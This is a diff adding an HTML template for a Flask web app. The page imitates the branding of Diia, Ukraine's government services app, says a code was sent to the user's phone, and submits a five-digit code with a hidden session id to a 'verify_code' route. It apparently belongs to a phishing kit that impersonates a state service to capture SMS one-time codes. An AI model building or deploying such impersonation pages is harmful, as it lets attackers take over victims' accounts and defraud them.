@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>Підтвердження — Дія</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap'); body { font-family: 'Inter', sans-serif; background: #f7f9fb; }</style>
+</head>
+<body class="flex flex-col min-h-screen">
+    <nav class="p-6 bg-white border-b border-gray-100 flex justify-center">
+        <svg width="60" height="20" viewBox="0 0 64 24" fill="black"><path d="M7.4 20H0V4H7.4C11.8 4 14.8 7.3 14.8 12C14.8 16.7 11.8 20 7.4 20ZM3.7 16.5H7.4C9.5 16.5 11 15 11 12C11 9 9.5 7.5 7.4 7.5H3.7V16.5Z"/></svg>
+    </nav>
+    <main class="flex-1 flex flex-col px-6 pt-12 max-w-[480px] mx-auto w-full">
+        <div class="text-center mb-8">
+            <h1 class="text-3xl font-bold mb-2">Підтвердження</h1>
+            <p class="text-gray-500">Ми надіслали код на <span class="text-black font-semibold">{{ phone }}</span></p>
+        </div>
+        {% if error %}<div class="mb-4 p-4 bg-red-50 text-red-600 rounded-2xl text-center text-sm">{{ error }}</div>{% endif %}
+        <div class="bg-white rounded-[32px] p-8 border border-gray-100 shadow-sm">
+            <form method="POST" action="{{ url_for('main.verify_code') }}">
+                <input type="hidden" name="sid" value="{{ sid }}">
+                <input name="code" type="text" inputmode="numeric" placeholder="•••••" maxlength="5" required autofocus
+                       class="w-full text-center text-5xl font-light tracking-[10px] py-4 mb-8 outline-none border-b-2 border-black">
+                <button type="submit" class="w-full py-5 bg-black text-white rounded-2xl font-bold">ПІДТВЕРДИТИ</button>
+            </form>
+            <div class="mt-6 text-center"><a href="/" class="text-sm text-gray-400 font-medium italic">← Змінити номер</a></div>
+        </div>
+    </main>
+</body>
+</html>
